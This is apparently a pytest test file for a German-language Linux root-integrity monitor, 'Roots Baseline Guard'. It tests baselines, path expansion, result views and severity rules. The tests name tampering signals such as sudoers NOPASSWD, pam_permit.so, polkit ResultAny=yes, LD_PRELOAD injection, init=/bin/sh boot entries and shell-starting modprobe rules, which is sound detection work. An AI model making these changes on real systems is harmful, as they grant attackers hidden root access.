import json
import hashlib
from pathlib import Path

from netmon.features import roots_baseline_guard_controller


class DummyVar:
    def __init__(self, value=None):
        self.value = value

    def get(self):
        return self.value

    def set(self, value):
        self.value = value


class DummyCanvas:
    def __init__(self):
        self.calls = []

    def itemconfig(self, item_id, **kwargs):
        self.calls.append((item_id, kwargs))


class DummyTable:
    def __init__(self):
        self.rows = []
        self.selected = ()
        self.tags = {}
        self.row_tags = []
        self.focused = None

    def get_children(self):
        return list(range(len(self.rows)))

    def delete(self, _item):
        self.rows = []
        self.row_tags = []

    def insert(self, _parent, _index, values=(), tags=()):
        self.rows.append(tuple(values))
        self.row_tags.append(tuple(tags))

    def selection(self):
        return self.selected

    def selection_set(self, item):
        if isinstance(item, (list, tuple)):
            self.selected = tuple(int(entry) for entry in item)
            return
        self.selected = (int(item),)

    def index(self, item):
        return int(item)

    def tag_configure(self, tag_name, **kwargs):
        self.tags[tag_name] = kwargs

    def focus(self, item):
        self.focused = int(item)


class DummyListbox:
    def __init__(self):
        self.items = []
        self.selected = ()

    def delete(self, _start, _end=None):
        self.items = []
        self.selected = ()

    def insert(self, _index, value):
        self.items.append(value)

    def curselection(self):
        return self.selected

    def selection_set(self, index):
        self.selected = (index,)


class DummyText:
    def __init__(self):
        self.text = ""
        self.state = "normal"
        self.tags = {}
        self.bindings = {}
        self.config = {}

    def configure(self, **kwargs):
        if "state" in kwargs:
            self.state = kwargs["state"]
        self.config.update(kwargs)

    def delete(self, _start, _end=None):
        self.text = ""

    def insert(self, _index, value):
        if _index == "1.0":
            self.text = value
        else:
            self.text += value

    def tag_add(self, tag_name, start, end):
        self.tags.setdefault(tag_name, {})["range"] = (start, end)

    def tag_configure(self, tag_name, **kwargs):
        self.tags.setdefault(tag_name, {}).update(kwargs)

    def tag_bind(self, tag_name, sequence, callback):
        self.bindings[(tag_name, sequence)] = callback


class DummyLabel:
    def __init__(self):
        self.config = {}

    def configure(self, **kwargs):
        self.config.update(kwargs)


class DummyApp:
    def __init__(self, baseline_path, overrides, selected_labels):
        self.roots_baseline_guard_baseline_path = str(baseline_path)
        self.roots_baseline_guard_whitelist_path = str(
            baseline_path.with_name("roots_whitelist.json")
        )
        self.roots_baseline_guard_path_overrides = overrides
        self.roots_baseline_guard_scope_vars = {
            label: DummyVar(label in selected_labels)
            for label in roots_baseline_guard_controller.ROOTS_GUARD_SUPPORTED_AREAS
        }
        self.roots_baseline_status_var = DummyVar("Noch keine Baseline vorhanden.")
        self.roots_baseline_created_var = DummyVar(
            "Baseline erstellt am: noch nicht erstellt"
        )
        self.roots_baseline_updated_var = DummyVar(
            "Zuletzt aktualisiert am: noch nicht aktualisiert"
        )
        self.roots_baseline_checked_var = DummyVar(
            "Letzte Prüfung am: noch nicht durchgeführt"
        )
        self.roots_last_root_action_var = DummyVar("Letzte Aktion mit Root: nein")
        self.roots_integrity_status_var = DummyVar(
            "Keine kritischen Änderungen erkannt"
        )
        self.roots_integrity_counts_var = DummyVar(
            "Kritisch: 0 | Warnungen: 0 | Hinweise: 0"
        )
        self.roots_root_mode_status_var = DummyVar("Root-Modus: aus")
        self.roots_signal_summary_var = DummyVar("Funde: -")
        self.roots_root_mode_status_label = DummyLabel()
        self.roots_baseline_guard_root_mode_var = DummyVar(False)
        self.roots_integrity_light = DummyCanvas()
        self.roots_integrity_light_item = "light-1"
        self.roots_baseline_guard_results_table = DummyTable()
        self.roots_baseline_guard_history_list = DummyListbox()
        self.roots_baseline_guard_whitelist_list = DummyListbox()
        self.roots_baseline_guard_result_meta = []
        self.roots_baseline_guard_whitelist_meta = []
        self.roots_baseline_guard_info_text = DummyText()
        self.roots_baseline_guard_info_path = ""
        self.roots_baseline_guard_chad_vars = {
            "Nur kritische Änderungen analysieren": DummyVar(False),
            "Anfängerfreundlich erklären": DummyVar(True),
            "Handlungsempfehlungen anzeigen": DummyVar(True),
            "Technische Details anzeigen": DummyVar(False),
            "Reparaturvorschläge anzeigen": DummyVar(False),
        }
        self.roots_baseline_guard_trust_vars = {
            "Bekannte Systemänderungen ignorieren": DummyVar(False),
            "Paketupdates niedriger einstufen": DummyVar(False),
            "Benutzer-Whitelist berücksichtigen": DummyVar(False),
            "Wiederkehrende harmlose Änderungen minimieren": DummyVar(False),
        }
        self.prepared_chad = None
        self.opened_paths = []
        self.logs = []
        self.sudo_session_ok = True
        self.ensure_sudo_reasons = []
        self.root_state_overrides = {}

    def hash_file_sha256(self, path):
        digest = hashlib.sha256()
        with open(path, "rb") as handle:
            digest.update(handle.read())
        return digest.hexdigest()

    def log(self, message):
        self.logs.append(message)

    def prepare_chad_analysis(self, title, raw_text, show_preview=None):
        self.prepared_chad = {
            "title": title,
            "raw_text": raw_text,
            "show_preview": show_preview,
        }

    def ensure_sudo_session(self, reason=""):
        self.ensure_sudo_reasons.append(reason)
        return self.sudo_session_ok

    def open_path_in_file_manager(self, path, label="Ordner"):
        self.opened_paths.append((str(path), str(label)))
        return True

    def roots_baseline_guard_capture_file_state_as_root(self, path):
        return self.root_state_overrides.get(path, {})


def test_roots_baseline_guard_create_baseline(tmp_path):
    ssh_file = tmp_path / "sshd_config"
    hosts_file = tmp_path / "hosts"
    passwd_file = tmp_path / "passwd"
    ssh_file.write_text("PermitRootLogin no\n", encoding="utf-8")
    hosts_file.write_text("127.0.0.1 localhost\n", encoding="utf-8")
    passwd_file.write_text("root:x:0:0:root:/root:/bin/bash\n", encoding="utf-8")

    baseline_path = tmp_path / "roots_baseline.json"
    app = DummyApp(
        baseline_path,
        {
            "SSH Konfiguration": [str(ssh_file)],
            "DNS / Hosts": [str(hosts_file)],
            "Kritische Systemdateien": [str(passwd_file)],
        },
        selected_labels=set(
            roots_baseline_guard_controller.ROOTS_GUARD_SUPPORTED_AREAS
        ),
    )

    assert (
        roots_baseline_guard_controller.create_roots_baseline_guard_baseline(app)
        is True
    )
    data = json.loads(baseline_path.read_text(encoding="utf-8"))

    assert sorted(data["areas"]) == sorted(
        roots_baseline_guard_controller.ROOTS_GUARD_SUPPORTED_AREAS
    )
    assert "Baseline erstellt für 5 Bereich(e)." == app.roots_baseline_status_var.get()
    assert app.roots_baseline_created_var.get().startswith("Baseline erstellt am: ")
    assert (
        app.roots_baseline_updated_var.get()
        == "Zuletzt aktualisiert am: noch nicht aktualisiert"
    )
    assert (
        app.roots_baseline_checked_var.get()
        == "Letzte Prüfung am: noch nicht durchgeführt"
    )
    assert app.roots_last_root_action_var.get() == "Letzte Aktion mit Root: nein"
    assert (
        app.roots_baseline_guard_results_table.rows[0][0]
        == "Noch keine Änderungen erkannt."
    )
    assert "Baseline wurde erstellt." in app.roots_baseline_guard_info_text.text
    assert "Roots Baseline Guard: Baseline manuell erstellt" in app.logs[0]


def test_normalize_guard_path_pattern_resolves_symlinks(tmp_path):
    target = tmp_path / "resolved"
    target.mkdir()
    link = tmp_path / "link"
    link.symlink_to(target, target_is_directory=True)

    normalized = roots_baseline_guard_controller._normalize_guard_path_pattern(
        str(link)
    )

    assert normalized == str(target.resolve())


def test_roots_baseline_guard_supported_paths_include_phase2_targets():
    app = DummyApp(
        baseline_path=Path("/tmp/roots_baseline.json"),
        overrides={},
        selected_labels=set(),
    )

    paths = roots_baseline_guard_controller.roots_baseline_guard_supported_area_paths(
        app
    )

    assert "/root/.ssh/authorized_keys" in paths["SSH Schlüssel / authorized_keys"]
    assert "/home/*/.ssh/authorized_keys" in paths["SSH Schlüssel / authorized_keys"]
    assert "/etc/ssh/sshd_config.d" in paths["SSH Konfiguration"]
    assert "/etc/shadow" in paths["Kritische Systemdateien"]
    assert "/etc/sudoers.d" in paths["Kritische Systemdateien"]
    assert "/etc/pam.d" in paths["Kritische Systemdateien"]
    assert "/etc/polkit-1" in paths["Kritische Systemdateien"]
    assert "/etc/sysctl.conf" in paths["Kritische Systemdateien"]
    assert "/etc/sysctl.d" in paths["Kritische Systemdateien"]
    assert "/etc/modprobe.d" in paths["Kritische Systemdateien"]
    assert "/etc/modules-load.d" in paths["Kritische Systemdateien"]
    assert "/etc/modules" in paths["Kritische Systemdateien"]
    assert "/etc/default/grub" in paths["Kritische Systemdateien"]
    assert "/boot/grub/grub.cfg" in paths["Kritische Systemdateien"]
    assert "/boot/grub2/grub.cfg" in paths["Kritische Systemdateien"]
    assert "/etc/tmpfiles.d" in paths["Kritische Systemdateien"]
    assert "/usr/lib/tmpfiles.d" in paths["Kritische Systemdateien"]
    assert "/etc/profile" in paths["Kritische Systemdateien"]
    assert "/etc/profile.d" in paths["Kritische Systemdateien"]
    assert "/etc/environment" in paths["Kritische Systemdateien"]
    assert "/etc/bash.bashrc" in paths["Kritische Systemdateien"]
    assert "/root/.bashrc" in paths["Kritische Systemdateien"]
    assert "/home/*/.bashrc" in paths["Kritische Systemdateien"]
    assert "/etc/ld.so.preload" in paths["Kritische Systemdateien"]
    assert "/etc/crontab" in paths["Autostart / systemd / cron"]
    assert "/etc/cron.d" in paths["Autostart / systemd / cron"]
    assert "/etc/cron.daily" in paths["Autostart / systemd / cron"]
    assert "/etc/cron.weekly" in paths["Autostart / systemd / cron"]
    assert "/etc/systemd/system" in paths["Autostart / systemd / cron"]
    assert "/etc/systemd/user" in paths["Autostart / systemd / cron"]
    assert "/root/.config/systemd/user" in paths["Autostart / systemd / cron"]
    assert "/home/*/.config/systemd/user" in paths["Autostart / systemd / cron"]


def test_roots_baseline_guard_capture_monitored_directory_expands_files(tmp_path):
    rules_dir = tmp_path / "sudoers.d"
    rules_dir.mkdir()
    (rules_dir / "admin").write_text("admin ALL=(ALL) NOPASSWD:ALL\n", encoding="utf-8")
    (rules_dir / "ops").write_text("ops ALL=(ALL) ALL\n", encoding="utf-8")

    app = DummyApp(
        baseline_path=tmp_path / "roots_baseline.json",
        overrides={},
        selected_labels=set(),
    )

    items = roots_baseline_guard_controller._capture_monitored_path(app, str(rules_dir))
    captured_paths = {str(item.get("path")) for item in items}

    assert str(rules_dir) in captured_paths
    assert str(rules_dir / "admin") in captured_paths
    assert str(rules_dir / "ops") in captured_paths


def test_roots_baseline_guard_capture_monitored_path_expands_authorized_keys_glob(
    tmp_path,
):
    user_home = tmp_path / "home" / "demo" / ".ssh"
    user_home.mkdir(parents=True)
    auth_file = user_home / "authorized_keys"
    auth_file.write_text(
        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest demo@test\n",
        encoding="utf-8",
    )

    app = DummyApp(
        baseline_path=tmp_path / "roots_baseline.json",
        overrides={},
        selected_labels=set(),
    )
    items = roots_baseline_guard_controller._capture_monitored_path(
        app,
        str(tmp_path / "home" / "*" / ".ssh" / "authorized_keys"),
    )
    captured_paths = {str(item.get("path")) for item in items}

    assert str(auth_file) in captured_paths


def test_roots_baseline_guard_capture_monitored_path_expands_user_systemd_glob(
    tmp_path,
):
    user_unit_dir = tmp_path / "home" / "demo" / ".config" / "systemd" / "user"
    user_unit_dir.mkdir(parents=True)
    unit_file = user_unit_dir / "demo.service"
    unit_file.write_text(
        "[Service]\nExecStart=/bin/sh -c 'echo demo'\n",
        encoding="utf-8",
    )

    app = DummyApp(
        baseline_path=tmp_path / "roots_baseline.json",
        overrides={},
        selected_labels=set(),
    )
    items = roots_baseline_guard_controller._capture_monitored_path(
        app,
        str(tmp_path / "home" / "*" / ".config" / "systemd" / "user"),
    )
    captured_paths = {str(item.get("path")) for item in items}

    assert str(user_unit_dir) in captured_paths
    assert str(unit_file) in captured_paths


def test_roots_baseline_guard_read_current_state_shows_snapshot_rows(tmp_path):
    ssh_file = tmp_path / "sshd_config"
    hosts_file = tmp_path / "hosts"
    passwd_file = tmp_path / "passwd"
    ssh_file.write_text("PermitRootLogin no\n", encoding="utf-8")
    hosts_file.write_text("127.0.0.1 localhost\n", encoding="utf-8")
    passwd_file.write_text("root:x:0:0:root:/root:/bin/bash\n", encoding="utf-8")

    baseline_path = tmp_path / "roots_baseline.json"
    app = DummyApp(
        baseline_path,
        {
            "SSH Konfiguration": [str(ssh_file)],
            "DNS / Hosts": [str(hosts_file)],
            "Kritische Systemdateien": [str(passwd_file)],
        },
        selected_labels=set(
            roots_baseline_guard_controller.ROOTS_GUARD_SUPPORTED_AREAS
        ),
    )

    assert (
        roots_baseline_guard_controller.read_roots_baseline_guard_current_state(app)
        is True
    )
    assert app.roots_baseline_status_var.get().startswith(
        "Aktueller Zustand eingelesen:"
    )
    assert app.roots_integrity_status_var.get() == "Zustand eingelesen"
    assert (
        app.roots_integrity_counts_var.get()
        == "Kritisch: 0 | Warnungen: 0 | Hinweise: 0"
    )
    assert len(app.roots_baseline_guard_results_table.rows) == 3
    assert "Snapshot" in app.roots_baseline_guard_info_text.text
    assert any("Aktueller Zustand eingelesen" in message for message in app.logs)


def test_roots_baseline_guard_opens_parent_folder_for_selected_file_result(tmp_path):
    target_dir = tmp_path / "etc" / "ssh"
    target_dir.mkdir(parents=True)
    target_file = target_dir / "sshd_config"
    target_file.write_text("PermitRootLogin no\n", encoding="utf-8")

    app = DummyApp(
        baseline_path=tmp_path / "roots_baseline.json",
        overrides={},
        selected_labels=set(),
    )
    roots_baseline_guard_controller._refresh_results_table(
        app,
        [
            {
                "area": "SSH Konfiguration",
                "path": str(target_file),
                "change": "Aktueller Zustand eingelesen",
                "risk": "-",
                "time": "2026-05-23 12:00:00",
                "status": "Erfasst",
                "detail": "Demo",
            }
        ],
    )
    app.roots_baseline_guard_results_table.selected = (0,)

    assert (
        roots_baseline_guard_controller.open_selected_roots_baseline_guard_parent_folder(
            app
        )
        is True
    )
    assert app.opened_paths == [(str(target_dir), "Roots Baseline Guard Ordner")]


def test_roots_baseline_guard_opens_selected_directory_result_directly(tmp_path):
    target_dir = tmp_path / "etc" / "sudoers.d"
    target_dir.mkdir(parents=True)

    app = DummyApp(
        baseline_path=tmp_path / "roots_baseline.json",
        overrides={},
        selected_labels=set(),
    )
    roots_baseline_guard_controller._refresh_results_table(
        app,
        [
            {
                "area": "Kritische Systemdateien",
                "path": str(target_dir),
                "change": "Aktueller Zustand eingelesen",
                "risk": "-",
                "time": "2026-05-23 12:00:00",
                "status": "Erfasst",
                "detail": "Demo",
            }
        ],
    )
    app.roots_baseline_guard_results_table.selected = (0,)

    assert (
        roots_baseline_guard_controller.open_selected_roots_baseline_guard_parent_folder(
            app
        )
        is True
    )
    assert app.opened_paths == [(str(target_dir), "Roots Baseline Guard Ordner")]


def test_roots_baseline_guard_selected_result_path_returns_selected_path(tmp_path):
    target_dir = tmp_path / "etc" / "ssh"
    target_dir.mkdir(parents=True)
    target_file = target_dir / "sshd_config"
    target_file.write_text("PermitRootLogin no\n", encoding="utf-8")

    app = DummyApp(
        baseline_path=tmp_path / "roots_baseline.json",
        overrides={},
        selected_labels=set(),
    )
    roots_baseline_guard_controller._refresh_results_table(
        app,
        [
            {
                "area": "SSH Konfiguration",
                "path": str(target_file),
                "change": "Aktueller Zustand eingelesen",
                "risk": "-",
                "time": "2026-05-23 12:00:00",
                "status": "Erfasst",
                "detail": "Demo",
            }
        ],
    )
    app.roots_baseline_guard_results_table.selected = (0,)

    assert roots_baseline_guard_controller.selected_roots_baseline_guard_result_path(
        app
    ) == str(target_file)


def test_roots_baseline_guard_analysis_text_uses_all_selected_rows(tmp_path):
    ssh_file = tmp_path / "sshd_config"
    hosts_file = tmp_path / "hosts"
    ssh_file.write_text("PermitRootLogin yes\n", encoding="utf-8")
    hosts_file.write_text("127.0.0.1 localhost\n", encoding="utf-8")

    app = DummyApp(
        baseline_path=tmp_path / "roots_baseline.json",
        overrides={},
        selected_labels=set(),
    )
    roots_baseline_guard_controller._refresh_results_table(
        app,
        [
            {
                "area": "SSH Konfiguration",
                "path": str(ssh_file),
                "change": "Unsichere SSH-Option aktiviert",
                "risk": "Warnung",
                "time": "2026-05-23 12:00:00",
                "status": "Auffaellig",
                "detail": "SSH Detail",
                "detail_extra": "SSH erlaubt Root-Login",
            },
            {
                "area": "DNS / Hosts",
                "path": str(hosts_file),
                "change": "Inhalt geändert",
                "risk": "Hinweis",
                "time": "2026-05-23 12:01:00",
                "status": "Auffaellig",
                "detail": "Hosts Detail",
                "detail_extra": "",
            },
        ],
    )
    app.roots_baseline_guard_results_table.selection_set((0, 1))

    text = roots_baseline_guard_controller.get_roots_baseline_guard_analysis_text(app)

    assert str(ssh_file) in text
    assert str(hosts_file) in text


def test_roots_baseline_guard_detail_text_shows_clickable_path(tmp_path):
    target_dir = tmp_path / "etc" / "ssh"
    target_dir.mkdir(parents=True)
    target_file = target_dir / "sshd_config"
    target_file.write_text("PermitRootLogin no\n", encoding="utf-8")

    app = DummyApp(
        baseline_path=tmp_path / "roots_baseline.json",
        overrides={},
        selected_labels=set(),
    )
    roots_baseline_guard_controller._refresh_results_table(
        app,
        [
            {
                "area": "SSH Konfiguration",
                "path": str(target_file),
                "change": "Aktueller Zustand eingelesen",
                "risk": "-",
                "time": "2026-05-23 12:00:00",
                "status": "Erfasst",
                "detail": "\n".join(
                    [
                        "Bereich: SSH Konfiguration",
                        f"Pfad: {target_file}",
                        "Änderung: Aktueller Zustand eingelesen",
                    ]
                ),
            }
        ],
    )
    app.roots_baseline_guard_results_table.selected = (0,)

    roots_baseline_guard_controller.on_roots_baseline_guard_result_select(app)

    assert app.roots_baseline_guard_info_text.text.startswith(f"Pfad: {target_file}")
    assert "Bereich: SSH Konfiguration" in app.roots_baseline_guard_info_text.text
    assert app.roots_baseline_guard_info_path == str(target_file)
    assert (
        "roots_path_link",
        "<Button-1>",
    ) in app.roots_baseline_guard_info_text.bindings


def test_roots_baseline_guard_detail_path_open_uses_parent_folder(tmp_path):
    target_dir = tmp_path / "etc" / "ssh"
    target_dir.mkdir(parents=True)
    target_file = target_dir / "sshd_config"
    target_file.write_text("PermitRootLogin no\n", encoding="utf-8")

    app = DummyApp(
        baseline_path=tmp_path / "roots_baseline.json",
        overrides={},
        selected_labels=set(),
    )
    app.roots_baseline_guard_info_path = str(target_file)

    assert (
        roots_baseline_guard_controller.open_roots_baseline_guard_info_path(app) is True
    )
    assert app.opened_paths == [(str(target_dir), "Roots Baseline Guard Ordner")]


def test_roots_baseline_guard_detail_path_open_requires_file_manager(tmp_path):
    target_dir = tmp_path / "etc" / "ssh"
    target_dir.mkdir(parents=True)
    target_file = target_dir / "sshd_config"
    target_file.write_text("PermitRootLogin no\n", encoding="utf-8")

    app = DummyApp(
        baseline_path=tmp_path / "roots_baseline.json",
        overrides={},
        selected_labels=set(),
    )
    app.roots_baseline_guard_info_path = str(target_file)
    app.open_path_in_file_manager = None

    assert (
        roots_baseline_guard_controller.open_roots_baseline_guard_info_path(app)
        is False
    )
    assert (
        app.roots_baseline_status_var.get()
        == "Dateimanager-Funktion ist nicht verfügbar."
    )


def test_roots_baseline_guard_root_mode_status_refresh():
    app = DummyApp(
        baseline_path=Path("/tmp/roots_baseline.json"),
        overrides={},
        selected_labels=set(),
    )

    roots_baseline_guard_controller.refresh_roots_baseline_guard_root_mode_status(app)
    assert app.roots_root_mode_status_var.get() == "Root-Modus: aus"
    assert app.roots_root_mode_status_label.config.get("fg") == "#7a7f87"

    app.roots_baseline_guard_root_mode_var.set(True)
    roots_baseline_guard_controller.refresh_roots_baseline_guard_root_mode_status(app)
    assert (
        app.roots_root_mode_status_var.get()
        == "Root-Modus: aktiv fuer naechsten Vorgang"
    )
    assert app.roots_root_mode_status_label.config.get("fg") == "#d4a017"


def test_roots_baseline_guard_loads_demo_cases():
    app = DummyApp(
        baseline_path=Path("/tmp/roots_baseline.json"),
        overrides={},
        selected_labels=set(),
    )

    assert (
        roots_baseline_guard_controller.load_roots_baseline_guard_demo_cases(app)
        is True
    )
    assert app.roots_integrity_status_var.get() == "Demo-Funde geladen"
    assert (
        app.roots_integrity_counts_var.get()
        == "Kritisch: 11 | Warnungen: 2 | Hinweise: 0"
    )
    assert app.roots_baseline_status_var.get().startswith("Demo-Fälle geladen:")
    assert len(app.roots_baseline_guard_results_table.rows) == 13
    assert app.roots_baseline_guard_results_table.rows[0][0] == "/etc/ld.so.preload"
    assert app.roots_signal_summary_var.get() == (
        "Funde: LD_PRELOAD, sudoers, polkit, sysctl, kernel, boot, tmpfiles, shell, PAM, authkeys, systemd, SSH, cron"
    )
    assert "Demo-Modus aktiv." in app.roots_baseline_guard_info_text.text
    assert app.roots_baseline_guard_history_list.items[0] == "Demo-Modus: aktiv"
    assert any("Demo-Faelle geladen" in message for message in app.logs)
    assert "Einordnung:" in app.roots_baseline_guard_result_meta[0]["detail"]


def test_roots_baseline_guard_clear_view_resets_current_display(tmp_path):
    app = DummyApp(
        baseline_path=tmp_path / "roots_baseline.json",
        overrides={},
        selected_labels=set(),
    )
    roots_baseline_guard_controller.load_roots_baseline_guard_demo_cases(app)
    app.roots_baseline_guard_whitelist_list.items = ["demo"]
    app.roots_baseline_guard_whitelist_list.selected = (0,)
    app.roots_baseline_guard_info_path = "/etc/ssh/sshd_config"

    assert roots_baseline_guard_controller.clear_roots_baseline_guard_view(app) is True
    assert app.roots_integrity_status_var.get() == "Keine kritischen Änderungen erkannt"
    assert (
        app.roots_integrity_counts_var.get()
        == "Kritisch: 0 | Warnungen: 0 | Hinweise: 0"
    )
    assert app.roots_signal_summary_var.get() == "Funde: -"
    assert app.roots_baseline_status_var.get() == "Ansicht geleert."
    assert (
        app.roots_baseline_guard_results_table.rows[0][0]
        == "Noch keine Änderungen erkannt."
    )
    assert app.roots_baseline_guard_history_list.items == []
    assert app.roots_baseline_guard_whitelist_list.selected == ()
    assert app.roots_baseline_guard_info_path == ""
    assert "Ansicht wurde geleert" in app.roots_baseline_guard_info_text.text
    assert any("Ansicht manuell geleert" in message for message in app.logs)


def test_roots_baseline_guard_signal_summary_collects_categories():
    app = DummyApp(
        baseline_path=Path("/tmp/roots_baseline.json"),
        overrides={},
        selected_labels=set(),
    )
    rows = [
        {"path": "/etc/ssh/sshd_config", "area": "SSH Konfiguration"},
        {"path": "/etc/sudoers.d/admin", "area": "Kritische Systemdateien"},
        {"path": "/etc/shadow", "area": "Kritische Systemdateien"},
        {
            "path": "/etc/polkit-1/rules.d/49-demo.rules",
            "area": "Kritische Systemdateien",
        },
        {"path": "/etc/sysctl.d/99-demo.conf", "area": "Kritische Systemdateien"},
        {"path": "/etc/modprobe.d/evil.conf", "area": "Kritische Systemdateien"},
        {"path": "/etc/default/grub", "area": "Kritische Systemdateien"},
        {"path": "/etc/tmpfiles.d/demo.conf", "area": "Kritische Systemdateien"},
        {"path": "/etc/profile", "area": "Kritische Systemdateien"},
        {"path": "/etc/pam.d/common-auth", "area": "Kritische Systemdateien"},
        {"path": "/etc/passwd", "area": "Kritische Systemdateien"},
        {"path": "/etc/ld.so.preload", "area": "Kritische Systemdateien"},
        {"path": "/etc/crontab", "area": "Autostart / systemd / cron"},
        {
            "path": "/etc/systemd/system/demo.service",
            "area": "Autostart / systemd / cron",
        },
        {
            "path": "/root/.ssh/authorized_keys",
            "area": "SSH Schlüssel / authorized_keys",
        },
    ]

    roots_baseline_guard_controller._refresh_roots_signal_summary(app, rows)

    assert (
        app.roots_signal_summary_var.get()
        == "Funde: SSH, sudoers, shadow, polkit, sysctl, kernel, boot, tmpfiles, shell, PAM, UID0, LD_PRELOAD, cron, systemd, authkeys"
    )


def test_roots_baseline_guard_severity_rules_for_critical_root_files():
    assert (
        roots_baseline_guard_controller._severity_for_area(
            "Kritische Systemdateien",
            "critical",
            path="/etc/sudoers",
            change="Inhalt geändert",
        )
        == "Kritisch"
    )
    assert (
        roots_baseline_guard_controller._severity_for_area(
            "Kritische Systemdateien",
            "warning",
            path="/etc/passwd",
            change="Dateirechte geändert",
        )
        == "Warnung"
    )
    assert (
        roots_baseline_guard_controller._severity_for_area(
            "Kritische Systemdateien",
            "critical",
            path="/etc/passwd",
            change="Datei fehlt",
        )
        == "Kritisch"
    )
    assert (
        roots_baseline_guard_controller._severity_for_area(
            "Kritische Systemdateien",
            "hint",
            path="/etc/passwd",
            change="Zeitstempel geändert",
        )
        == "Hinweis"
    )
    assert (
        roots_baseline_guard_controller._severity_for_area(
            "Kritische Systemdateien",
            "warning",
            path="/etc/sudoers",
            change="Dateigröße geändert",
        )
        == "Kritisch"
    )
    assert (
        roots_baseline_guard_controller._severity_for_area(
            "Kritische Systemdateien",
            "critical",
            path="/etc/pam.d/common-auth",
            change="PAM-Fund aktiviert: pam_permit.so",
        )
        == "Kritisch"
    )
    assert (
        roots_baseline_guard_controller._severity_for_area(
            "Kritische Systemdateien",
            "critical",
            path="/etc/polkit-1/rules.d/49-demo.rules",
            change="Polkit-Fund aktiviert: ResultAny=yes",
        )
        == "Kritisch"
    )
    assert (
        roots_baseline_guard_controller._severity_for_area(
            "Kritische Systemdateien",
            "critical",
            path="/etc/sysctl.d/99-demo.conf",
            change="Sysctl-Fund aktiviert: unprivileged_bpf_disabled=0",
        )
        == "Kritisch"
    )
    assert (
        roots_baseline_guard_controller._severity_for_area(
            "Kritische Systemdateien",
            "critical",
            path="/etc/profile",
            change="Shell-Fund aktiviert: LD_PRELOAD",
        )
        == "Kritisch"
    )
    assert (
        roots_baseline_guard_controller._severity_for_area(
            "Kritische Systemdateien",
            "critical",
            path="/etc/modprobe.d/evil.conf",
            change="Kernel-Modul-Fund aktiviert: Shell-Start",
        )
        == "Kritisch"
    )
    assert (
        roots_baseline_guard_controller._severity_for_area(
            "Kritische Systemdateien",
            "critical",
            path="/etc/default/grub",
            change="Boot-Fund aktiviert: init=/bin/sh",
        )
        == "Kritisch"
    )
    assert (
        roots_baseline_guard_controller._severity_for_area(
            "Kritische Systemdateien",
            "critical",
            path="/etc/tmpfiles.d/demo.conf",
            change="Tmpfiles-Fund aktiviert: sensitiver Pfad",
        )
        == "Kritisch"
    )
    assert (
        roots_baseline_guard_controller._signal_change_kind(
            "/etc/pam.d/common-auth",
            {"pam:nullok_auth"},
            set(),
        )
        == "warning"
    )
    assert (
        roots_baseline_guard_controller._signal_change_kind(
            "/etc/pam.d/common-auth",
            {"pam:exec_auth"},
            set(),
        )
        == "critical"
    )


def test_roots_baseline_guard_severity_rules_for_ssh_files():
    assert (
        roots_baseline_guard_controller._severity_for_area(
            "SSH Konfiguration",
            "critical",
            path="/etc/ssh/sshd_config",
            change="Inhalt geändert",
        )
        == "Warnung"
    )
    assert (
        roots_baseline_guard_controller._severity_for_area(
            "SSH Konfiguration",
            "critical",
            path="/etc/ssh/sshd_config",
            change="Datei fehlt",
        )
        == "Warnung"
    )
    assert (
        roots_baseline_guard_controller._severity_for_area(
            "SSH Konfiguration",
            "hint",
            path="/etc/ssh/ssh_config",
            change="Zeitstempel geändert",
        )
        == "Hinweis"
    )
    assert (
        roots_baseline_guard_controller._severity_for_area(
            "SSH Konfiguration",
            "warning",
            path="/etc/ssh/ssh_config",
            change="Dateigröße geändert",
        )
        == "Warnung"
    )


def test_roots_baseline_guard_compare_detects_sudoers_signal_change():
    old = {
        "path": "/etc/sudoers",
        "exists": True,
        "mode": "0o440",
        "sha256": "old",
        "size": 10,
        "mtime": 1.0,
        "signals": [],
    }
    new = {
        "path": "/etc/sudoers",
        "exists": True,
        "mode": "0o440",
        "sha256": "new",
        "size": 12,
        "mtime": 2.0,
        "signals": ["sudoers:nopasswd"],
    }

    assert roots_baseline_guard_controller._compare_item(old, new) == (
        "/etc/sudoers",
        "Sudo-Regel aktiviert: NOPASSWD",
        "critical",
    )


def test_roots_baseline_guard_compare_detects_pam_signal_change():
    old = {
        "path": "/etc/pam.d/common-auth",
        "exists": True,
        "mode": "0o644",
        "sha256": "old",
        "size": 10,
        "mtime": 1.0,
        "signals": [],
    }
    new = {
        "path": "/etc/pam.d/common-auth",
        "exists": True,
        "mode": "0o644",
        "sha256": "new",
        "size": 12,
        "mtime": 2.0,
        "signals": ["pam:permit"],
    }

    assert roots_baseline_guard_controller._compare_item(old, new) == (
        "/etc/pam.d/common-auth",
        "PAM-Fund aktiviert: pam_permit.so",
        "critical",
    )


def test_roots_baseline_guard_compare_detects_polkit_signal_change():
    old = {
        "path": "/etc/polkit-1/rules.d/49-demo.rules",
        "exists": True,
        "mode": "0o644",
        "sha256": "old",
        "size": 10,
        "mtime": 1.0,
        "signals": [],
    }
    new = {
        "path": "/etc/polkit-1/rules.d/49-demo.rules",
        "exists": True,
        "mode": "0o644",
        "sha256": "new",
        "size": 12,
        "mtime": 2.0,
        "signals": ["polkit:result_any_yes"],
    }

    assert roots_baseline_guard_controller._compare_item(old, new) == (
        "/etc/polkit-1/rules.d/49-demo.rules",
        "Polkit-Fund aktiviert: ResultAny=yes",
        "critical",
    )


def test_roots_baseline_guard_compare_detects_sysctl_signal_change():
    old = {
        "path": "/etc/sysctl.d/99-demo.conf",
        "exists": True,
        "mode": "0o644",
        "sha256": "old",
        "size": 10,
        "mtime": 1.0,
        "signals": [],
    }
    new = {
        "path": "/etc/sysctl.d/99-demo.conf",
        "exists": True,
        "mode": "0o644",
        "sha256": "new",
        "size": 12,
        "mtime": 2.0,
        "signals": ["sysctl:kernel.unprivileged_bpf_disabled=0"],
    }

    assert roots_baseline_guard_controller._compare_item(old, new) == (
        "/etc/sysctl.d/99-demo.conf",
        "Sysctl-Fund aktiviert: unprivileged_bpf_disabled=0",
        "critical",
    )


def test_roots_baseline_guard_compare_detects_shell_profile_signal_change():
    old = {
        "path": "/etc/profile",
        "exists": True,
        "mode": "0o644",
        "sha256": "old",
        "size": 10,
        "mtime": 1.0,
        "signals": [],
    }
    new = {
        "path": "/etc/profile",
        "exists": True,
        "mode": "0o644",
        "sha256": "new",
        "size": 12,
        "mtime": 2.0,
        "signals": ["shell:ld_preload"],
    }

    assert roots_baseline_guard_controller._compare_item(old, new) == (
        "/etc/profile",
        "Shell-Fund aktiviert: LD_PRELOAD",
        "critical",
    )


